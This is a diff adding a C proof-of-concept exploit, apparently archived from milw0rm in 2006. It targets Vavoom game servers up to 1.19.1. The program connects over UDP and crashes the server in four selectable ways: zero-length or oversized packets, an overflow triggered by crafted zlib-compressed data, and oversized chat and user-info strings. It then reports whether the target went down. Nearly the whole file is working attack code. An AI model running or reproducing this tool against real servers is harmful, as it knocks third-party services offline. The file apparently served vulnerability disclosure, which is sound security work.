@@ -1,0 +1,537 @@
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <zlib.h>
+
+#ifdef WIN32
+    #include <winsock.h>
+/*
+   Header file used for manage errors in Windows
+   It support socket and errno too
+   (this header replace the previous sock_errX.h)
+*/
+
+#include <string.h>
+#include <errno.h>
+
+void std_err(void) {
+    char    *error;
+
+    switch(WSAGetLastError()) {
+        case 10004: error = "Interrupted system call"; break;
+        case 10009: error = "Bad file number"; break;
+        case 10013: error = "Permission denied"; break;
+        case 10014: error = "Bad address"; break;
+        case 10022: error = "Invalid argument (not bind)"; break;
+        case 10024: error = "Too many open files"; break;
+        case 10035: error = "Operation would block"; break;
+        case 10036: error = "Operation now in progress"; break;
+        case 10037: error = "Operation already in progress"; break;
+        case 10038: error = "Socket operation on non-socket"; break;
+        case 10039: error = "Destination address required"; break;
+        case 10040: error = "Message too long"; break;
+        case 10041: error = "Protocol wrong type for socket"; break;
+        case 10042: error = "Bad protocol option"; break;
+        case 10043: error = "Protocol not supported"; break;
+        case 10044: error = "Socket type not supported"; break;
+        case 10045: error = "Operation not supported on socket"; break;
+        case 10046: error = "Protocol family not supported"; break;
+        case 10047: error = "Address family not supported by protocol family"; break;
+        case 10048: error = "Address already in use"; break;
+        case 10049: error = "Can't assign requested address"; break;
+        case 10050: error = "Network is down"; break;
+        case 10051: error = "Network is unreachable"; break;
+        case 10052: error = "Net dropped connection or reset"; break;
+        case 10053: error = "Software caused connection abort"; break;
+        case 10054: error = "Connection reset by peer"; break;
+        case 10055: error = "No buffer space available"; break;
+        case 10056: error = "Socket is already connected"; break;
+        case 10057: error = "Socket is not connected"; break;
+        case 10058: error = "Can't send after socket shutdown"; break;
+        case 10059: error = "Too many references, can't splice"; break;
+        case 10060: error = "Connection timed out"; break;
+        case 10061: error = "Connection refused"; break;
+        case 10062: error = "Too many levels of symbolic links"; break;
+        case 10063: error = "File name too long"; break;
+        case 10064: error = "Host is down"; break;
+        case 10065: error = "No Route to Host"; break;
+        case 10066: error = "Directory not empty"; break;
+        case 10067: error = "Too many processes"; break;
+        case 10068: error = "Too many users"; break;
+        case 10069: error = "Disc Quota Exceeded"; break;
+        case 10070: error = "Stale NFS file handle"; break;
+        case 10091: error = "Network SubSystem is unavailable"; break;
+        case 10092: error = "WINSOCK DLL Version out of range"; break;
+        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
+        case 10071: error = "Too many levels of remote in path"; break;
+        case 11001: error = "Host not found"; break;
+        case 11002: error = "Non-Authoritative Host not found"; break;
+        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
+        case 11004: error = "Valid name, no data record of requested type"; break;
+        default: error = strerror(errno); break;
+    }
+    fprintf(stderr, "\nError: %s\n", error);
+    exit(1);
+}
+
+    #define close   closesocket
+    #define ONESEC  1000
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <sys/param.h>
+    #include <arpa/inet.h>
+    #include <netinet/in.h>
+    #include <netdb.h>
+
+    #define ONESEC  1
+#endif
+
+
+
+#define VER             "0.1"
+#define PORT            26000
+#define BUFFSZ          8192
+#define MAXSZ           (0x7ff - NET_HEADERSIZE)    // this is the max
+#define BOFSZ           1040                        // less than CBOFSZ and major than MAX_DATAGRAM
+#define CBOFSZ          0x7ff                       // 1200 (or less) is enough
+#define FLAGZ(x,y)      x | (y & NETFLAG_COMPR_LEN_MASK) | ((len << 16) & NETFLAG_LENGTH_MASK)
+#define NICK            "\\class\\0"    \
+                        "\\color\\0"    \
+                        "\\name\\"
+
+#define NET_HEADERSIZE  10
+#define MAX_DATAGRAM    1024
+#define MAX_INFO_STRING 1024
+#define MaxSize         4096
+
+enum {
+    clc_bad,
+    clc_nop,
+    clc_disconnect,
+    clc_move,
+    clc_stringcmd,
+    clc_player_info,
+};
+
+//  NetHeader flags
+#define NETFLAG_COMPR_LEN_MASK	0x000007ff
+#define NETFLAG_COMPR_MODE_MASK	0x0000f800
+#define NETFLAG_LENGTH_MASK		0x07ff0000
+#define NETFLAG_FLAGS_MASK		0xf8000000
+#define NETFLAG_COMPR_NONE		0x00000000
+#define NETFLAG_COMPR_ZIP		0x00000800
+#define NETFLAG_EOM				0x08000000
+#define NETFLAG_ACK				0x10000000
+#define NETFLAG_DATA			0x20000000
+#define NETFLAG_UNRELIABLE		0x40000000
+#define NETFLAG_CTL				0x80000000
+
+//  Client request
+#define CCREQ_CONNECT			1
+#define CCREQ_SERVER_INFO		2
+
+//  Server reply
+#define CCREP_ACCEPT			11
+#define CCREP_REJECT			12
+#define CCREP_SERVER_INFO		13
+
+
+
+int info_proto(u_char *data, int len);
+u_short vavoom_crc(u_char *data, int len);
+int mycpy(u_char *dst, u_char *src);
+int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err);
+int timeout(int sock, int sec);
+u_int resolv(char *host);
+void std_err(void);
+
+
+
+struct  sockaddr_in peer;
+
+
+
+int main(int argc, char *argv[]) {
+    long    clen;
+    u_int   seed,
+            *flags,
+            *seq,
+            seqn;
+    int     sd,
+            i,
+            len,
+            ulen,
+            ver  = 1,
+            attack;
+    u_short port = PORT,
+            cport,
+            *crc;
+    u_char  buff[BUFFSZ],
+            cbof[MAXSZ],
+            *p;
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "Vavoom <= 1.19.1 multiple vulnerabilities " VER "\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@autistici.org\n"
+        "web:    http://aluigi.altervista.org\n"
+        "\n", stdout);
+
+    if(argc < 3) {
+        printf("\n"
+            "Usage: %s <attack> <host> [port(%hu)]\n"
+            "\n"
+            "Attack:\n"
+            " 1 = socket unreachable through empty or big packet\n"
+            " 2 = decompression crash (unexploitable buffer-overflow)\n"
+            " 3 = SV_BroadcastPrintf / Serialize crash (caused by bug 2)\n"
+            " 4 = SV_SetUserInfo crash / Info_SetValueForKey: oversize infostring\n"
+            "     (caused by bug 2)\n"
+            "\n", argv[0], port);
+        exit(1);
+    }
+
+    attack = atoi(argv[1]);
+
+    if(argc > 3) port    = atoi(argv[3]);
+    peer.sin_addr.s_addr = resolv(argv[2]);
+    peer.sin_port        = htons(port);
+    peer.sin_family      = AF_INET;
+
+    printf("- target   %s : %hu\n",
+        inet_ntoa(peer.sin_addr), port);
+
+    flags = (u_int *)buff;
+    seq   = (u_int *)(buff + 4);
+    crc   = (u_short *)(buff + 8);
+    seed  = time(NULL);
+
+    printf("- query server:\n");
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+
+    p      = buff + 4;
+    *p++   = CCREQ_SERVER_INFO;
+    p     += mycpy(p, "VAVOOM");
+    *p++   = ver;
+    len    = p - buff;
+    *flags = htonl(FLAGZ(NETFLAG_CTL, 0));
+
+    len = send_recv(sd, buff, len, buff, sizeof(buff), 1);
+    close(sd);
+    ver = info_proto(buff, len);
+
+    if(attack == 1) {
+        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+        if(sd < 0) std_err();
+
+        printf("- send zero length packet\n");
+        send_recv(sd, buff, 0, buff, sizeof(buff), 0);
+
+        printf("- send big packet\n");
+        send_recv(sd, buff, MaxSize + 1, buff, sizeof(buff), 0);
+
+        close(sd);
+        goto quit;
+    }
+
+    printf("- start connection:\n");
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+
+    printf("- send connection request\n");
+    p      = buff + 4;
+    *p++   = CCREQ_CONNECT;
+    p     += mycpy(p, "VAVOOM");
+    *p++   = ver;
+    len    = p - buff;
+    *flags = htonl(FLAGZ(NETFLAG_CTL, 0));
+
+    len = send_recv(sd, buff, len, buff, sizeof(buff), 1);
+
+    if(buff[4] != CCREP_ACCEPT) {
+        printf("\nError: your connection has not been accepted\n\n");
+        exit(1);
+    }
+
+    cport = *(u_short *)(buff + 5); // I don't know why this is not in network byte order
+    printf("- use server port %hu\n", cport);
+    peer.sin_port = htons(cport);
+    seqn = 0;
+
+    printf("- send ack\n");         // useless
+    p      = buff + NET_HEADERSIZE;
+    len    = p - buff;
+    *flags = htonl(FLAGZ(NETFLAG_ACK, 0));
+    *seq   = seqn++;
+    *crc   = htons(0);
+
+    len = send_recv(sd, buff, len, buff, sizeof(buff), 1);
+
+    if(attack == 2) {
+        printf("- lot of compressed data\n");
+        p      = buff + NET_HEADERSIZE;
+
+        ulen   = CBOFSZ;    // uncompressed size
+        clen   = MAXSZ;     // compressed size (not important, just enough big)
+        memset(cbof, 'A', ulen);
+        compress(p, &clen, cbof, ulen);
+        p     += clen;
+        len    = p - buff;
+
+        *flags = htonl(FLAGZ(NETFLAG_DATA | NETFLAG_UNRELIABLE | NETFLAG_COMPR_ZIP, ulen));
+        *seq   = seqn++;
+        *crc   = htons(vavoom_crc(buff + NET_HEADERSIZE, len - NET_HEADERSIZE));
+
+    } else if(attack == 3) {
+        printf("- big say string\n");
+        p      = buff + NET_HEADERSIZE;
+
+        ulen   = BOFSZ;
+        clen   = MAXSZ;
+        *cbof  = clc_stringcmd;
+        memset(cbof + 1, 'A', ulen);
+        memcpy(cbof + 1, "Say ", 4);
+        cbof[ulen - 1] = 0;
+        compress(p, &clen, cbof, ulen);
+        p     += clen;
+        len    = p - buff;
+
+        *flags = htonl(FLAGZ(NETFLAG_DATA | NETFLAG_UNRELIABLE | NETFLAG_COMPR_ZIP, ulen));
+        *seq   = seqn++;
+        *crc   = htons(vavoom_crc(buff + NET_HEADERSIZE, len - NET_HEADERSIZE));
+
+    } else if(attack == 4) {
+        printf("- big user info\n");
+        p      = buff + NET_HEADERSIZE;
+
+        ulen   = BOFSZ;
+        clen   = MAXSZ;
+        *cbof  = clc_player_info;
+        memset(cbof + 1, 'A', ulen);
+        memcpy(cbof + 1, NICK, sizeof(NICK) - 1);
+        cbof[ulen - 1] = 0;
+        compress(p, &clen, cbof, ulen);
+        p     += clen;
+        len    = p - buff;
+
+        *flags = htonl(FLAGZ(NETFLAG_DATA | NETFLAG_UNRELIABLE | NETFLAG_COMPR_ZIP, ulen));
+        *seq   = seqn++;
+        *crc   = htons(vavoom_crc(buff + NET_HEADERSIZE, len - NET_HEADERSIZE));
+
+    } else {
+        printf("\nError: wrong attack number (%d)\n\n", attack);
+        exit(1);
+    }
+
+    len = send_recv(sd, buff, len, buff, sizeof(buff), 0);
+    if(len < 0) {
+        printf("- no reply from the server\n");
+    }
+
+    close(sd);
+
+quit:
+    printf("- wait some seconds\n");
+    for(i = 3; i; i--) {
+        printf("%d\r", i);
+        sleep(ONESEC);
+    }
+
+    printf("- check server:\n");
+    peer.sin_port = htons(port);
+
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+
+    p      = buff + 4;
+    *p++   = CCREQ_SERVER_INFO;
+    p     += mycpy(p, "VAVOOM");
+    *p++   = ver;
+    len    = p - buff;
+    *flags = htonl(FLAGZ(NETFLAG_CTL, 0));
+
+    if(send_recv(sd, buff, len, buff, sizeof(buff), 0) < 0) {
+        printf("\n  Server IS vulnerable!!!\n\n");
+    } else {
+        printf("\n  Server does not seem vulnerable\n\n");
+    }
+    close(sd);
+    return(0);
+}
+
+
+
+int info_proto(u_char *data, int len) {
+    u_int   flags;
+    int     ver;
+    u_char  cmd,
+            *limit;
+
+    limit = data + len;
+    flags = *(u_int *)data;                                 data += 4;
+    cmd   = *data;                                          data++;
+    printf("  Hostname   %s\n", data);                      data += strlen(data) + 1;
+    printf("  Level      %s\n", data);                      data += strlen(data) + 1;
+    printf("  Players    %hhu/%hhu\n", data[0], data[1]);   data += 2;
+    ver   = *data;                                          data++;
+    printf("  Version    %d\n", ver);
+    printf("  Wads       ");
+    while(data < limit) {
+        printf("%s", data);                                 data += strlen(data) + 1;
+        if(!*data) break;
+        printf(", ");
+    }
+    printf("\n");
+
+    return(ver);
+}
+
+
+
+u_short vavoom_crc(u_char *data, int len) {
+    u_short crc;
+    const static u_short table[] = {
+        0x0000,	0x1021,	0x2042,	0x3063,	0x4084,	0x50a5,	0x60c6,	0x70e7,
+        0x8108,	0x9129,	0xa14a,	0xb16b,	0xc18c,	0xd1ad,	0xe1ce,	0xf1ef,
+        0x1231,	0x0210,	0x3273,	0x2252,	0x52b5,	0x4294,	0x72f7,	0x62d6,
+        0x9339,	0x8318,	0xb37b,	0xa35a,	0xd3bd,	0xc39c,	0xf3ff,	0xe3de,
+        0x2462,	0x3443,	0x0420,	0x1401,	0x64e6,	0x74c7,	0x44a4,	0x5485,
+        0xa56a,	0xb54b,	0x8528,	0x9509,	0xe5ee,	0xf5cf,	0xc5ac,	0xd58d,
+        0x3653,	0x2672,	0x1611,	0x0630,	0x76d7,	0x66f6,	0x5695,	0x46b4,
+        0xb75b,	0xa77a,	0x9719,	0x8738,	0xf7df,	0xe7fe,	0xd79d,	0xc7bc,
+        0x48c4,	0x58e5,	0x6886,	0x78a7,	0x0840,	0x1861,	0x2802,	0x3823,
+        0xc9cc,	0xd9ed,	0xe98e,	0xf9af,	0x8948,	0x9969,	0xa90a,	0xb92b,
+        0x5af5,	0x4ad4,	0x7ab7,	0x6a96,	0x1a71,	0x0a50,	0x3a33,	0x2a12,
+        0xdbfd,	0xcbdc,	0xfbbf,	0xeb9e,	0x9b79,	0x8b58,	0xbb3b,	0xab1a,
+        0x6ca6,	0x7c87,	0x4ce4,	0x5cc5,	0x2c22,	0x3c03,	0x0c60,	0x1c41,
+        0xedae,	0xfd8f,	0xcdec,	0xddcd,	0xad2a,	0xbd0b,	0x8d68,	0x9d49,
+        0x7e97,	0x6eb6,	0x5ed5,	0x4ef4,	0x3e13,	0x2e32,	0x1e51,	0x0e70,
+        0xff9f,	0xefbe,	0xdfdd,	0xcffc,	0xbf1b,	0xaf3a,	0x9f59,	0x8f78,
+        0x9188,	0x81a9,	0xb1ca,	0xa1eb,	0xd10c,	0xc12d,	0xf14e,	0xe16f,
+        0x1080,	0x00a1,	0x30c2,	0x20e3,	0x5004,	0x4025,	0x7046,	0x6067,
+        0x83b9,	0x9398,	0xa3fb,	0xb3da,	0xc33d,	0xd31c,	0xe37f,	0xf35e,
+        0x02b1,	0x1290,	0x22f3,	0x32d2,	0x4235,	0x5214,	0x6277,	0x7256,
+        0xb5ea,	0xa5cb,	0x95a8,	0x8589,	0xf56e,	0xe54f,	0xd52c,	0xc50d,
+        0x34e2,	0x24c3,	0x14a0,	0x0481,	0x7466,	0x6447,	0x5424,	0x4405,
+        0xa7db,	0xb7fa,	0x8799,	0x97b8,	0xe75f,	0xf77e,	0xc71d,	0xd73c,
+        0x26d3,	0x36f2,	0x0691,	0x16b0,	0x6657,	0x7676,	0x4615,	0x5634,
+        0xd94c,	0xc96d,	0xf90e,	0xe92f,	0x99c8,	0x89e9,	0xb98a,	0xa9ab,
+        0x5844,	0x4865,	0x7806,	0x6827,	0x18c0,	0x08e1,	0x3882,	0x28a3,
+        0xcb7d,	0xdb5c,	0xeb3f,	0xfb1e,	0x8bf9,	0x9bd8,	0xabbb,	0xbb9a,
+        0x4a75,	0x5a54,	0x6a37,	0x7a16,	0x0af1,	0x1ad0,	0x2ab3,	0x3a92,
+        0xfd2e,	0xed0f,	0xdd6c,	0xcd4d,	0xbdaa,	0xad8b,	0x9de8,	0x8dc9,
+        0x7c26,	0x6c07,	0x5c64,	0x4c45,	0x3ca2,	0x2c83,	0x1ce0,	0x0cc1,
+        0xef1f,	0xff3e,	0xcf5d,	0xdf7c,	0xaf9b,	0xbfba,	0x8fd9,	0x9ff8,
+        0x6e17,	0x7e36,	0x4e55,	0x5e74,	0x2e93,	0x3eb2,	0x0ed1,	0x1ef0
+    };
+
+    crc = 0xffff;
+
+    while(len--) {
+        crc = (crc << 8) ^ table[(crc >> 8) ^ *data];
+        data++;
+    }
+
+    return(crc);
+}
+
+
+
+int mycpy(u_char *dst, u_char *src) {
+    u_char  *p;
+
+    for(p = dst; *src; src++, p++) {
+        *p = *src;
+    }
+    *p++ = 0;
+    return(p - dst);
+}
+
+
+
+int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err) {
+    int     retry,
+            len;
+
+    if(in) {
+        for(retry = 3; retry; retry--) {
+            if(sendto(sd, in, insz, 0, (struct sockaddr *)&peer, sizeof(peer))
+              < 0) std_err();
+            if(!timeout(sd, 2)) break;
+        }
+
+        if(!retry) {
+            if(!err) return(-1);
+            fputs("\nError: socket timeout, no reply received\n\n", stdout);
+            exit(1);
+        }
+    } else {
+        if(timeout(sd, 3) < 0) return(-1);
+    }
+
+    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
+    if(len < 0) std_err();
+    return(len);
+}
+
+
+
+int timeout(int sock, int sec) {
+    struct  timeval tout;
+    fd_set  fd_read;
+    int     err;
+
+    tout.tv_sec  = sec;
+    tout.tv_usec = 0;
+    FD_ZERO(&fd_read);
+    FD_SET(sock, &fd_read);
+    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
+    if(err < 0) std_err();
+    if(!err) return(-1);
+    return(0);
+}
+
+
+
+u_int resolv(char *host) {
+    struct  hostent *hp;
+    u_int   host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf("\nError: Unable to resolv hostname (%s)\n", host);
+            exit(1);
+        } else host_ip = *(u_int *)(hp->h_addr);
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror("\nError");
+        exit(1);
+    }
+#endif
+
+// milw0rm.com [2006-03-26]
